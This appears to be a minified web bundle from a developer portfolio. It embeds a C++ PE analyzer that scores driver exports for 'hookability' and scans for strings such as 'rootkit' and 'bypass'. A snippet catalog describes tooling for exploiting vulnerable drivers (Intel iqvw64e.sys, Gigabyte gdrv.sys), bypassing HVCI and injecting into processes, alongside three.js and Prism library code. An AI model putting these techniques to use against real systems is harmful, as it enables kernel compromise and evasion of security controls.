        if ((section.Characteristics & SECTION_WRITABLE) &&
            (section.Characteristics & SECTION_EXECUTABLE)) {

            Finding f;
            f.type = "Writable+Executable Section";
            f.severity = 8.5f;
            f.location = sectionName;
            f.description = "Section is writable and executable - potential code injection vector";
            findings.push_back(f);
        }

        // Large writable data sections (callback tables)
        if ((section.Characteristics & SECTION_WRITABLE) &&
            !(section.Characteristics & SECTION_EXECUTABLE) &&
            section.VirtualSize > 0x2000) {

            Finding f;
            f.type = "Large Writable Data Section";
            f.severity = 6.5f;
            f.location = sectionName;
            f.description = "Large writable section could contain callback/dispatch tables";
            findings.push_back(f);
        }
    }

    // Scan for suspicious strings
    const char* suspiciousStrings[] = {
        "hook", "callback", "intercept", "rootkit", "bypass"
    };

    for (const auto& suspStr : suspiciousStrings) {
        size_t suspLen = strlen(suspStr);
        for (DWORD i = 0; i < fileSize - suspLen; i++) {
            if (memcmp(fileData + i, suspStr, suspLen) == 0) {
                Finding f;
                f.type = "Suspicious String";
                f.severity = 5.0f;
                f.location = "Offset: 0x" + std::to_string(i);
                f.description = std::string("Contains suspicious string: \\"") + suspStr + "\\"";
                findings.push_back(f);
                break;
            }
        }
    }

    return findings;
}

// Assess hookability of a function
float AssessHookability(const ExportedFunction& func, const std::vector<SECTION_HEADER>& sections) {
    float score = 3.0f;

    std::string nameUpper = func.name;
    std::transform(nameUpper.begin(), nameUpper.end(), nameUpper.begin(), ::toupper);

    if (nameUpper.find("CALLBACK") != std::string::npos) score += 3.0f;
    if (nameUpper.find("HANDLER") != std::string::npos) score += 2.5f;
    if (nameUpper.find("FILTER") != std::string::npos) score += 2.0f;
    if (nameUpper.find("DISPATCH") != std::string::npos) score += 2.0f;
    if (nameUpper.find("ROUTINE") != std::string::npos) score += 1.5f;
    if (nameUpper.find("NOTIFY") != std::string::npos) score += 1.5f;

    return score > 10.0f ? 10.0f : score;
}

std::string GetRiskLevel(float hookability) {
    if (hookability >= 8.0f) return "CRITICAL";
    if (hookability >= 6.0f) return "HIGH";
    if (hookability >= 4.0f) return "MEDIUM";
    return "LOW";
}

// Extract and analyze exported functions
std::vector<ExportedFunction> ExtractHookableExports(BYTE* fileData, DWORD fileSize, const std::vector<SECTION_HEADER>& sections) {
    std::vector<ExportedFunction> hookablePoints;

    DWORD peOffset = GetPEOffset(fileData);
    FILE_HEADER* fileHeader = (FILE_HEADER*)(fileData + peOffset + 4);
    OPTIONAL_HEADER* optHeader = (OPTIONAL_HEADER*)(fileData + peOffset + 4 + sizeof(FILE_HEADER));

    DATA_DIRECTORY* exportDir = (DATA_DIRECTORY*)(optHeader + 1);

    if (exportDir->VirtualAddress == 0 || exportDir->Size == 0) {
        return hookablePoints;
    }

    int exportSectionIdx = FindSectionByRVA(sections, exportDir->VirtualAddress);
    if (exportSectionIdx < 0) {
        return hookablePoints;
    }

    const SECTION_HEADER& exportSection = sections[exportSectionIdx];
    DWORD exportOffset = exportDir->VirtualAddress - exportSection.VirtualAddress + exportSection.PointerToRawData;

    if (exportOffset + sizeof(EXPORT_DIRECTORY) > fileSize) {
        return hookablePoints;
    }

    EXPORT_DIRECTORY* expDir = (EXPORT_DIRECTORY*)(fileData + exportOffset);

    if (expDir->AddressTableEntries == 0 || expDir->NumberOfNamePointers == 0) {
        return hookablePoints;
    }

    DWORD* nameTable = NULL;
    WORD* ordinalTable = NULL;
    DWORD* funcTable = NULL;

    int nameTableSectionIdx = FindSectionByRVA(sections, expDir->NamePointerTableRVA);
    if (nameTableSectionIdx >= 0) {
        DWORD nameTableOffset = expDir->NamePointerTableRVA - sections[nameTableSectionIdx].VirtualAddress +
            sections[nameTableSectionIdx].PointerToRawData;
        nameTable = (DWORD*)(fileData + nameTableOffset);
    }

    int ordinalTableSectionIdx = FindSectionByRVA(sections, expDir->OrdinalTableRVA);
    if (ordinalTableSectionIdx >= 0) {
        DWORD ordinalTableOffset = expDir->OrdinalTableRVA - sections[ordinalTableSectionIdx].VirtualAddress +
            sections[ordinalTableSectionIdx].PointerToRawData;
        ordinalTable = (WORD*)(fileData + ordinalTableOffset);
    }

    int funcTableSectionIdx = FindSectionByRVA(sections, expDir->ExportAddressTableRVA);
    if (funcTableSectionIdx >= 0) {
        DWORD funcTableOffset = expDir->ExportAddressTableRVA - sections[funcTableSectionIdx].VirtualAddress +
            sections[funcTableSectionIdx].PointerToRawData;
        funcTable = (DWORD*)(fileData + funcTableOffset);
    }

    // Parse exported functions
    for (DWORD i = 0; i < expDir->NumberOfNamePointers; i++) {
        if (!nameTable || !ordinalTable || !funcTable) break;

        DWORD nameRVA = nameTable[i];
        WORD ordinal = ordinalTable[i];
        DWORD funcRVA = funcTable[ordinal];

        int nameSecIdx = FindSectionByRVA(sections, nameRVA);
        if (nameSecIdx < 0) continue;

        DWORD nameOffset = nameRVA - sections[nameSecIdx].VirtualAddress + sections[nameSecIdx].PointerToRawData;
        char* funcName = (char*)(fileData + nameOffset);

        ExportedFunction exp;
        exp.name = funcName;
        exp.address = funcRVA + optHeader->ImageBase;
        exp.ordinal = ordinal + expDir->OrdinalBase;
        exp.hookability = AssessHookability(exp, sections);
        exp.riskLevel = GetRiskLevel(exp.hookability);

        // Only add if hookability score is high
        if (exp.hookability >= 5.0f) {
            hookablePoints.push_back(exp);
        }
    }

    // Sort by hookability
    std::sort(hookablePoints.begin(), hookablePoints.end(),
        [](const ExportedFunction& a, const ExportedFunction& b) {
            return a.hookability > b.hookability;
        });

    return hookablePoints;
}

VulnerableDriver AnalyzeDriver(const char* driverPath) {
    VulnerableDriver result;
`,sr=[{id:"manual_map",projectId:"winint",file:"manual_map.cpp",lang:"cpp",lineStart:218,lineEnd:246,label:"iat-walk",caption:"IAT resolution: walk IMAGE_IMPORT_DESCRIPTOR, resolve ordinal+named thunks, patch via WriteProcessMemory"},{id:"sigscan",projectId:"winint",file:"sigscan.cpp",lang:"cpp",lineStart:88,lineEnd:122,label:"simd-scan",caption:"SIMD pattern scan with mask construction"},{id:"ioctl_dispatch",projectId:"winint",file:"ioctl_dispatch.c",lang:"c",lineStart:301,lineEnd:348,label:"irp-route",caption:"IRP_MJ dispatch table and IRP completion routine"},{id:"iat_patch",projectId:"winint",file:"iat_patch.cpp",lang:"cpp",lineStart:142,lineEnd:178,label:"iat-rewrite",caption:"Cross-process IAT rewrite with relocation table fixup"},{id:"intel_mmmap",projectId:"winint",file:"intel_exploit.cpp",lang:"cpp",lineStart:158,lineEnd:220,label:"mm-map-locked",caption:"Intel iqvw64e.sys exploit primitives: MmAllocatePagesForMdl + MmMapLockedPagesSpecifyCache + MmProtectMdlSystemAddress for kernel RWX without DSE bypass"},{id:"intel_mapio",projectId:"winint",file:"intel_exploit.cpp",lang:"cpp",lineStart:84,lineEnd:130,label:"mapio-rwx",caption:"Physical-address read/write via MapIoSpace — turns the Intel driver IOCTL into an arbitrary kernel R/W primitive"},{id:"kernel_resolver",projectId:"winint",file:"kernel_loader.cpp",lang:"cpp",lineStart:6,lineEnd:100,label:"export-resolve",caption:"PsLoadedModuleList walk + PE export-table resolution from usermode, used to bootstrap kernel-side function pointers without symbols"},{id:"kernel_init_user",projectId:"winint",file:"kernel_loader.cpp",lang:"cpp",lineStart:124,lineEnd:184,label:"init-usercode",caption:"InitializeUserCode: usermode shellcode marshaling and kernel-side execution context setup"},{id:"page_walk",projectId:"winint",file:"page_walk.cpp",lang:"cpp",lineStart:38,lineEnd:175,label:"pte-walk",caption:"Manual 4-level page-table walk (PML4 → PDPT → PD → PT) — checks present/large-page/2MB/1GB at every level"},{id:"page_protect_check",projectId:"winint",file:"page_walk.cpp",lang:"cpp",lineStart:244,lineEnd:290,label:"pte-rwx",caption:"IsPageReadable / IsPageWriteable / IsPageExecuteable — read PTE.NX bit and check W bit + ring level for the target VA"},{id:"drv_entry",projectId:"winint",file:"drv_entry.cpp",lang:"cpp",lineStart:257,lineEnd:360,label:"driver-entry",caption:"DriverEntry: register IRP handlers, allocate device, ExInitializeFastMutex on the control table, hand-off to DriverDispatch"},{id:"drv_ift_probe",projectId:"winint",file:"drv_entry.cpp",lang:"cpp",lineStart:173,lineEnd:215,label:"ift-probe",caption:"TestInvertedFunctionTable: walk PsInvertedFunctionTable to confirm SEH unwind metadata is registered for the loaded driver image"},{id:"mm_section_map",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:42,lineEnd:105,label:"section-copy",caption:"MapImageSection: walk IMAGE_SECTION_HEADER table, RtlCopyMemory each section to its VirtualAddress with SizeOfRawData"},{id:"mm_reloc",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:91,lineEnd:175,label:"reloc-fixup",caption:"MapImageRelocation: walk IMAGE_BASE_RELOCATION blocks, apply IMAGE_REL_BASED_DIR64 deltas to rebase the image to its mapped address"},{id:"mm_imports",projectId:"winint",file:"mm_map_section.cpp",lang:"cpp",lineStart:326,lineEnd:408,label:"import-resolve",caption:"MapImageImportDescriptor: walk import descriptors, LoadLibrary each, GetProcAddress each thunk, patch the IAT in-place"},{id:"mem_read",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:7,lineEnd:90,label:"mem-read",caption:"OnUserMemoryRead: PsLookupProcessByProcessId → KeStackAttachProcess → MmCopyVirtualMemory with probed source range"},{id:"mem_protect",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:142,lineEnd:200,label:"mem-protect",caption:"OnUserMemoryProtect: ZwProtectVirtualMemory cross-process with PAGE_EXECUTE_READWRITE; the protect/unprotect dance for hot patching"},{id:"irp_dispatch",projectId:"winint",file:"mem_dispatch.cpp",lang:"cpp",lineStart:198,lineEnd:360,label:"irp-router",caption:"DispatchDeviceControl: probe IRP buffers, fan-out to per-control handlers (Read/Write/Query/Protect/MemoryCommit/MemoryFree)"},{id:"grdv_naldrv",projectId:"winint",file:"grdv_naldrv.cpp",lang:"cpp",lineStart:48,lineEnd:145,label:"gdrv-rwx",caption:"Gigabyte gdrv.sys (CVE-2018-19320) IOCTL exploit: turn the network-driver memcopy primitive into arbitrary kernel R/W"},{id:"grdv_ntoskrnl",projectId:"winint",file:"grdv_ntoskrnl_map.cpp",lang:"cpp",lineStart:20,lineEnd:110,label:"ntos-mapper",caption:"Map ntoskrnl.exe from disk, parse PE export directory in usermode, resolve kernel function RVAs without symbols or PDBs"},{id:"grdv_shellcode",projectId:"winint",file:"grdv_shellcode.cpp",lang:"cpp",lineStart:8,lineEnd:110,label:"shellcode-emit",caption:"x64 shellcode builder: byte/word/dword/qword emitter with relocation patch table for the kernel-mode bootstrap stub"},{id:"hvci_kforge",projectId:"winint",file:"hvci_kforge.cpp",lang:"cpp",lineStart:60,lineEnd:200,label:"kforge-pfn",caption:"HVCI / VBS bypass: PFN database walk + page-protection flip while hypervisor-protected code integrity is enforced"},{id:"hvci_exploit",projectId:"winint",file:"hvci_exploit.cpp",lang:"cpp",lineStart:9,lineEnd:90,label:"eproc-walk",caption:"PsLookupProcessByProcessId → walk EPROCESS to find target KTHREAD, install kernel R/W primitive over its TrapFrame"},{id:"vuln_pe",projectId:"winint",file:"vuln_pe.cpp",lang:"cpp",lineStart:18,lineEnd:130,label:"pe-walker",caption:"Vulnerable-driver loader: PE parser, section-by-RVA resolver, IMAGE_REL_BASED_DIR64 relocation fixup before IOCTL marshaling"},{id:"ekm_freeze",projectId:"winint",file:"ekm_memory.c",lang:"c",lineStart:5,lineEnd:78,label:"freeze-dump",caption:"Kernel-mode freeze/dump/thaw: PsSuspendThread across every thread of a target PID, MmCopyVirtualMemory each section, resume"},{id:"hijack_window",projectId:"winint",file:"hijack_window.cpp",lang:"cpp",lineStart:6,lineEnd:70,label:"window-enum",caption:"EnumWindows callback that filters by process name, GetClassName each handle, returns matched HWND for control-handle hijacking"},{id:"lua_injector",projectId:"winint",file:"lua_injector.cpp",lang:"cpp",lineStart:20,lineEnd:180,label:"lua-inject",caption:"Usermode injector: GetProcessIdByName, suspend all threads, VirtualAllocEx + WriteProcessMemory the lua bootstrap, CreateRemoteThread, resume"},{id:"soundmap_sign",projectId:"soundmap",file:"soundmap_sign.py",lang:"python",lineStart:42,lineEnd:78,label:"hmac-chain",caption:"Multi-stage HMAC-chain that signs Soundmap mobile API requests"},{id:"soundmap_request",projectId:"soundmap",file:"soundmap_request.py",lang:"python",lineStart:88,lineEnd:124,label:"request-flow",caption:"Authenticated request flow with retry + token refresh"},{id:"poe_null_scene",projectId:"poe_null",file:"poe_null_scene.cs",lang:"csharp",lineStart:174,lineEnd:218,label:"game-state",caption:"Real-time game-state diff over the PoE2 ECS"},{id:"trade_limit",projectId:"trade_api",file:"trade_limit.py",lang:"python",lineStart:118,lineEnd:156,label:"token-bucket",caption:"Token-bucket limiter with sliding-window backoff"},{id:"poe_watcher_detect",projectId:"poe_watcher",file:"poe_watcher_detect.py",lang:"python",lineStart:33,lineEnd:68,label:"foreground-detect",caption:"Foreground-window detection with PoE1 vs PoE2 disambiguation"},{id:"vaal_route",projectId:"vaal",file:"vaal_route.py",lang:"python",lineStart:60,lineEnd:102,label:"model-routing",caption:"Model-router across Ollama and cloud providers with tool-use fan-out"},{id:"vaal_tooluse",projectId:"vaal",file:"vaal_tooluse.py",lang:"python",lineStart:140,lineEnd:176,label:"tool-use",caption:"Streaming tool-use loop with cancellation"},{id:"minabot_cog",projectId:"minabot",file:"minabot_cog.py",lang:"python",lineStart:212,lineEnd:254,label:"cog-loader",caption:"Hot-reloading cog plugin loader"},{id:"pentest_plugin",projectId:"pentest",file:"pentest_plugin.py",lang:"python",lineStart:88,lineEnd:134,label:"plugin-pipeline",caption:"Plugin pipeline with payload composition"},{id:"crypto_backtest",projectId:"crypto",file:"crypto_backtest.py",lang:"python",lineStart:144,lineEnd:186,label:"backtest-loop",caption:"Vectorized backtest with PnL and drawdown reporting"},{id:"poe_ml_train",projectId:"poe_ml",file:"poe_ml_train.py",lang:"python",lineStart:60,lineEnd:96,label:"train-loop",caption:"Training loop with mixed-precision + grad accumulation"}],Vh=Object.assign({"../snippets/crypto_backtest.py":fh,"../snippets/drv_entry.cpp":hh,"../snippets/ekm_memory.c":mh,"../snippets/grdv_naldrv.cpp":_h,"../snippets/grdv_ntoskrnl_map.cpp":gh,"../snippets/grdv_shellcode.cpp":vh,"../snippets/hijack_window.cpp":xh,"../snippets/hvci_exploit.cpp":Eh,"../snippets/hvci_kforge.cpp":yh,"../snippets/iat_patch.cpp":Sh,"../snippets/intel_exploit.cpp":Mh,"../snippets/ioctl_dispatch.c":bh,"../snippets/kernel_loader.cpp":Th,"../snippets/lua_injector.cpp":Ah,"../snippets/manual_map.cpp":Rh,"../snippets/mem_dispatch.cpp":wh,"../snippets/minabot_cog.py":Ch,"../snippets/mm_map_section.cpp":Ph,"../snippets/page_walk.cpp":Ih,"../snippets/pentest_plugin.py":Lh,"../snippets/poe_ml_train.py":Dh,"../snippets/poe_null_scene.cs":Nh,"../snippets/poe_watcher_detect.py":Oh,"../snippets/sigscan.cpp":Uh,"../snippets/soundmap_request.py":Fh,"../snippets/soundmap_sign.py":kh,"../snippets/trade_limit.py":zh,"../snippets/vaal_route.py":Bh,"../snippets/vaal_tooluse.py":Gh,"../snippets/vuln_pe.cpp":Hh});function Wh(i){const e=Object.entries(Vh).find(([t])=>t.endsWith("/"+i));return e?e[1]:null}const Vr=1600,Wr=900,Xh=6,qh=10,Yh=10.6,Xr=10414591;function jh(i){const e=new Map;for(const s of sr)e.has(s.projectId)||e.set(s.projectId,[]),e.get(s.projectId).push(s);const t=new Map;i.nodes.forEach(s=>{s.knotId&&(t.has(s.knotId)||t.set(s.knotId,[]),t.get(s.knotId).push(s))});const n=[],r=[];for(const[s,o]of e){const a=i.knots.find(m=>m.id===s);if(!a)continue;const l=t.get(a.id)??[];if(!l.length)continue;const d=a.x-Vr/2,u=-(a.y-Wr/2),h=a.z,p=[...l].map(m=>{const E=m.x-Vr/2,x=-(m.y-Wr/2),f=(E-d)**2+(x-u)**2+(m.z-h)**2;return{n:m,d:f}}).sort((m,E)=>E.d-m.d).map(m=>m.n);for(let m=0;m<o.length;m++){const E=p[m%p.length];n.push(new L(E.x-Vr/2,-(E.y-Wr/2),E.z)),r.push(o[m])}}return{pos:n,anchors:r}}function Kh(i){const{pos:e,anchors:t}=jh(i),n=new ps(Xh,14,12),r=new pi({color:Xr}),s=new Gr(n,r,Math.max(1,e.length));s.frustumCulled=!1;const o=new er(qh,Yh,40),a=new pi({color:Xr,transparent:!0,opacity:.7,side:Ut}),l=new Gr(o,a,Math.max(1,e.length));l.frustumCulled=!1;const d=new er(14,16,40),u=new pi({color:Xr,transparent:!0,opacity:.18,side:Ut}),h=new Gr(d,u,Math.max(1,e.length));h.frustumCulled=!1;const p=new Ze;for(let m=0;m<e.length;m++)p.identity(),p.setPosition(e[m]),s.setMatrixAt(m,p),l.setMatrixAt(m,p),h.setMatrixAt(m,p);return s.instanceMatrix.needsUpdate=!0,l.instanceMatrix.needsUpdate=!0,h.instanceMatrix.needsUpdate=!0,{pinDots:s,pinRings:l,pinHalos:h,pinPositions:e,pinAnchors:t}}function $h(i,e,t){const n=new Ze,r=e*.6,s=1+.18*Math.sin(e*1.4),o=1+.08*Math.sin(e*2.2);for(let a=0;a<i.pinPositions.length;a++){const l=i.pinPositions[a],d=a===t,u=(d?1.45:1)*o;n.makeScale(u,u,u),n.setPosition(l.x,l.y,l.z),i.pinDots.setMatrixAt(a,n);const h=d?1.25:1;n.makeRotationZ(r),n.scale(new L(h,h,h)),n.setPosition(l.x,l.y,l.z),i.pinRings.setMatrixAt(a,n);const p=(d?1.4:1)*s;n.makeRotationZ(-r*.5),n.scale(new L(p,p,p)),n.setPosition(l.x,l.y,l.z),i.pinHalos.setMatrixAt(a,n)}i.pinDots.instanceMatrix.needsUpdate=!0,i.pinRings.instanceMatrix.needsUpdate=!0,i.pinHalos.instanceMatrix.needsUpdate=!0}function Zh(i,e,t,n){const r=new Lo,s=new Be;let o=null;const a=l=>{const d=i.getBoundingClientRect();s.x=(l.clientX-d.left)/d.width*2-1,s.y=-((l.clientY-d.top)/d.height)*2+1,r.setFromCamera(s,e);const u=r.intersectObject(t.pinDots,!1);let h=null;if(u.length){const p=u[0].instanceId;typeof p=="number"&&p<t.pinAnchors.length&&(h=p)}h!==o?(o=h,n({pin:h===null?null:t.pinAnchors[h],index:h,clientX:l.clientX,clientY:l.clientY})):h!==null&&n({pin:t.pinAnchors[h],index:h,clientX:l.clientX,clientY:l.clientY})};return i.addEventListener("pointermove",a),()=>i.removeEventListener("pointermove",a)}var Qa=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Qh(i){return i&&i.__esModule&&Object.prototype.hasOwnProperty.call(i,"default")?i.default:i}var Oo={exports:{}};(function(i){var e=typeof window<"u"?window:typeof WorkerGlobalScope<"u"&&self instanceof WorkerGlobalScope?self:{};/**
 * Prism: Lightweight, robust, elegant syntax highlighting
 *
 * @license MIT <https://opensource.org/licenses/MIT>
 * @author Lea Verou <https://lea.verou.me>
 * @namespace
 * @public
 */var t=function(n){var r=/(?:^|\s)lang(?:uage)?-([\w-]+)(?=\s|$)/i,s=0,o={},a={manual:n.Prism&&n.Prism.manual,disableWorkerMessageHandler:n.Prism&&n.Prism.disableWorkerMessageHandler,util:{encode:function g(_){return _ instanceof l?new l(_.type,g(_.content),_.alias):Array.isArray(_)?_.map(g):_.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(g){return Object.prototype.toString.call(g).slice(8,-1)},objId:function(g){return g.__id||Object.defineProperty(g,"__id",{value:++s}),g.__id},clone:function g(_,v){v=v||{};var w,M;switch(a.util.type(_)){case"Object":if(M=a.util.objId(_),v[M])return v[M];w={},v[M]=w;for(var T in _)_.hasOwnProperty(T)&&(w[T]=g(_[T],v));return w;case"Array":return M=a.util.objId(_),v[M]?v[M]:(w=[],v[M]=w,_.forEach(function(D,y){w[y]=g(D,v)}),w);default:return _}},getLanguage:function(g){for(;g;){var _=r.exec(g.className);if(_)return _[1].toLowerCase();g=g.parentElement}return"none"},setLanguage:function(g,_){g.className=g.className.replace(RegExp(r,"gi"),""),g.classList.add("language-"+_)},currentScript:function(){if(typeof document>"u")return null;if(document.currentScript&&document.currentScript.tagName==="SCRIPT")return document.currentScript;try{throw new Error}catch(w){var g=(/at [^(\r\n]*\((.*):[^:]+:[^:]+\)$/i.exec(w.stack)||[])[1];if(g){var _=document.getElementsByTagName("script");for(var v in _)if(_[v].src==g)return _[v]}return null}},isActive:function(g,_,v){for(var w="no-"+_;g;){var M=g.classList;if(M.contains(_))return!0;if(M.contains(w))return!1;g=g.parentElement}return!!v}},languages:{plain:o,plaintext:o,text:o,txt:o,extend:function(g,_){var v=a.util.clone(a.languages[g]);for(var w in _)v[w]=_[w];return v},insertBefore:function(g,_,v,w){w=w||a.languages;var M=w[g],T={};for(var D in M)if(M.hasOwnProperty(D)){if(D==_)for(var y in v)v.hasOwnProperty(y)&&(T[y]=v[y]);v.hasOwnProperty(D)||(T[D]=M[D])}var R=w[g];return w[g]=T,a.languages.DFS(a.languages,function(k,X){X===R&&k!=g&&(this[k]=T)}),T},DFS:function g(_,v,w,M){M=M||{};var T=a.util.objId;for(var D in _)if(_.hasOwnProperty(D)){v.call(_,D,_[D],w||D);var y=_[D],R=a.util.type(y);R==="Object"&&!M[T(y)]?(M[T(y)]=!0,g(y,v,null,M)):R==="Array"&&!M[T(y)]&&(M[T(y)]=!0,g(y,v,D,M))}}},plugins:{},highlightAll:function(g,_){a.highlightAllUnder(document,g,_)},highlightAllUnder:function(g,_,v){var w={callback:v,container:g,selector:'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'};a.hooks.run("before-highlightall",w),w.elements=Array.prototype.slice.apply(w.container.querySelectorAll(w.selector)),a.hooks.run("before-all-elements-highlight",w);for(var M=0,T;T=w.elements[M++];)a.highlightElement(T,_===!0,w.callback)},highlightElement:function(g,_,v){var w=a.util.getLanguage(g),M=a.languages[w];a.util.setLanguage(g,w);var T=g.parentElement;T&&T.nodeName.toLowerCase()==="pre"&&a.util.setLanguage(T,w);var D=g.textContent,y={element:g,language:w,grammar:M,code:D};function R(X){y.highlightedCode=X,a.hooks.run("before-insert",y),y.element.innerHTML=y.highlightedCode,a.hooks.run("after-highlight",y),a.hooks.run("complete",y),v&&v.call(y.element)}if(a.hooks.run("before-sanity-check",y),T=y.element.parentElement,T&&T.nodeName.toLowerCase()==="pre"&&!T.hasAttribute("tabindex")&&T.setAttribute("tabindex","0"),!y.code){a.hooks.run("complete",y),v&&v.call(y.element);return}if(a.hooks.run("before-highlight",y),!y.grammar){R(a.util.encode(y.code));return}if(_&&n.Worker){var k=new Worker(a.filename);k.onmessage=function(X){R(X.data)},k.postMessage(JSON.stringify({language:y.language,code:y.code,immediateClose:!0}))}else R(a.highlight(y.code,y.grammar,y.language))},highlight:function(g,_,v){var w={code:g,grammar:_,language:v};if(a.hooks.run("before-tokenize",w),!w.grammar)throw new Error('The language "'+w.language+'" has no grammar.');return w.tokens=a.tokenize(w.code,w.grammar),a.hooks.run("after-tokenize",w),l.stringify(a.util.encode(w.tokens),w.language)},tokenize:function(g,_){var v=_.rest;if(v){for(var w in v)_[w]=v[w];delete _.rest}var M=new h;return p(M,M.head,g),u(g,M,_,M.head,0),E(M)},hooks:{all:{},add:function(g,_){var v=a.hooks.all;v[g]=v[g]||[],v[g].push(_)},run:function(g,_){var v=a.hooks.all[g];if(!(!v||!v.length))for(var w=0,M;M=v[w++];)M(_)}},Token:l};n.Prism=a;function l(g,_,v,w){this.type=g,this.content=_,this.alias=v,this.length=(w||"").length|0}l.stringify=function g(_,v){if(typeof _=="string")return _;if(Array.isArray(_)){var w="";return _.forEach(function(R){w+=g(R,v)}),w}var M={type:_.type,content:g(_.content,v),tag:"span",classes:["token",_.type],attributes:{},language:v},T=_.alias;T&&(Array.isArray(T)?Array.prototype.push.apply(M.classes,T):M.classes.push(T)),a.hooks.run("wrap",M);var D="";for(var y in M.attributes)D+=" "+y+'="'+(M.attributes[y]||"").replace(/"/g,"&quot;")+'"';return"<"+M.tag+' class="'+M.classes.join(" ")+'"'+D+">"+M.content+"</"+M.tag+">"};function d(g,_,v,w){g.lastIndex=_;var M=g.exec(v);if(M&&w&&M[1]){var T=M[1].length;M.index+=T,M[0]=M[0].slice(T)}return M}function u(g,_,v,w,M,T){for(var D in v)if(!(!v.hasOwnProperty(D)||!v[D])){var y=v[D];y=Array.isArray(y)?y:[y];for(var R=0;R<y.length;++R){if(T&&T.cause==D+","+R)return;var k=y[R],X=k.inside,te=!!k.lookbehind,P=!!k.greedy,z=k.alias;if(P&&!k.pattern.global){var W=k.pattern.toString().match(/[imsuy]*$/)[0];k.pattern=RegExp(k.pattern.source,W+"g")}for(var Y=k.pattern||k,H=w.next,V=M;H!==_.tail&&!(T&&V>=T.reach);V+=H.value.length,H=H.next){var q=H.value;if(_.length>g.length)return;if(!(q instanceof l)){var Q=1,$;if(P){if($=d(Y,V,g,te),!$||$.index>=g.length)break;var pe=$.index,G=$.index+$[0].length,j=V;for(j+=H.value.length;pe>=j;)H=H.next,j+=H.value.length;if(j-=H.value.length,V=j,H.value instanceof l)continue;for(var re=H;re!==_.tail&&(j<G||typeof re.value=="string");re=re.next)Q++,j+=re.value.length;Q--,q=g.slice(V,j),$.index-=V}else if($=d(Y,0,q,te),!$)continue;var pe=$.index,ue=$[0],Me=q.slice(0,pe),Te=q.slice(pe+ue.length),ge=V+q.length;T&&ge>T.reach&&(T.reach=ge);var Oe=H.prev;Me&&(Oe=p(_,Oe,Me),V+=Me.length),m(_,Oe,Q);var N=new l(D,X?a.tokenize(ue,X):ue,z,ue);if(H=p(_,Oe,N),Te&&p(_,H,Te),Q>1){var nt={cause:D+","+R,reach:ge};u(g,_,v,H.prev,V,nt),T&&nt.reach>T.reach&&(T.reach=nt.reach)}}}}}}function h(){var g={value:null,prev:null,next:null},_={value:null,prev:g,next:null};g.next=_,this.head=g,this.tail=_,this.length=0}function p(g,_,v){var w=_.next,M={value:v,prev:_,next:w};return _.next=M,w.prev=M,g.length++,M}function m(g,_,v){for(var w=_.next,M=0;M<v&&w!==g.tail;M++)w=w.next;_.next=w,w.prev=_,g.length-=M}function E(g){for(var _=[],v=g.head.next;v!==g.tail;)_.push(v.value),v=v.next;return _}if(!n.document)return n.addEventListener&&(a.disableWorkerMessageHandler||n.addEventListener("message",function(g){var _=JSON.parse(g.data),v=_.language,w=_.code,M=_.immediateClose;n.postMessage(a.highlight(w,a.languages[v],v)),M&&n.close()},!1)),a;var x=a.util.currentScript();x&&(a.filename=x.src,x.hasAttribute("data-manual")&&(a.manual=!0));function f(){a.manual||a.highlightAll()}if(!a.manual){var c=document.readyState;c==="loading"||c==="interactive"&&x&&x.defer?document.addEventListener("DOMContentLoaded",f):window.requestAnimationFrame?window.requestAnimationFrame(f):window.setTimeout(f,16)}return a}(e);i.exports&&(i.exports=t),typeof Qa<"u"&&(Qa.Prism=t),t.languages.markup={comment:{pattern:/<!--(?:(?!<!--)[\s\S])*?-->/,greedy:!0},prolog:{pattern:/<\?[\s\S]+?\?>/,greedy:!0},doctype:{pattern:/<!DOCTYPE(?:[^>"'[\]]|"[^"]*"|'[^']*')+(?:\[(?:[^<"'\]]|"[^"]*"|'[^']*'|<(?!!--)|<!--(?:[^-]|-(?!->))*-->)*\]\s*)?>/i,greedy:!0,inside:{"internal-subset":{pattern:/(^[^\[]*\[)[\s\S]+(?=\]>$)/,lookbehind:!0,greedy:!0,inside:null},string:{pattern:/"[^"]*"|'[^']*'/,greedy:!0},punctuation:/^<!|>$|[[\]]/,"doctype-tag":/^DOCTYPE/i,name:/[^\s<>'"]+/}},cdata:{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,greedy:!0},tag:{pattern:/<\/?(?!\d)[^\s>\/=$<%]+(?:\s(?:\s*[^\s>\/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))|(?=[\s/>])))+)?\s*\/?>/,greedy:!0,inside:{tag:{pattern:/^<\/?[^\s>\/]+/,inside:{punctuation:/^<\/?/,namespace:/^[^\s>\/:]+:/}},"special-attr":[],"attr-value":{pattern:/=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+)/,inside:{punctuation:[{pattern:/^=/,alias:"attr-equals"},{pattern:/^(\s*)["']|["']$/,lookbehind:!0}]}},punctuation:/\/?>/,"attr-name":{pattern:/[^\s>\/]+/,inside:{namespace:/^[^\s>\/:]+:/}}}},entity:[{pattern:/&[\da-z]{1,8};/i,alias:"named-entity"},/&#x?[\da-f]{1,8};/i]},t.languages.markup.tag.inside["attr-value"].inside.entity=t.languages.markup.entity,t.languages.markup.doctype.inside["internal-subset"].inside=t.languages.markup,t.hooks.add("wrap",function(n){n.type==="entity"&&(n.attributes.title=n.content.replace(/&amp;/,"&"))}),Object.defineProperty(t.languages.markup.tag,"addInlined",{value:function(r,s){var o={};o["language-"+s]={pattern:/(^<!\[CDATA\[)[\s\S]+?(?=\]\]>$)/i,lookbehind:!0,inside:t.languages[s]},o.cdata=/^<!\[CDATA\[|\]\]>$/i;var a={"included-cdata":{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,inside:o}};a["language-"+s]={pattern:/[\s\S]+/,inside:t.languages[s]};var l={};l[r]={pattern:RegExp(/(<__[^>]*>)(?:<!\[CDATA\[(?:[^\]]|\](?!\]>))*\]\]>|(?!<!\[CDATA\[)[\s\S])*?(?=<\/__>)/.source.replace(/__/g,function(){return 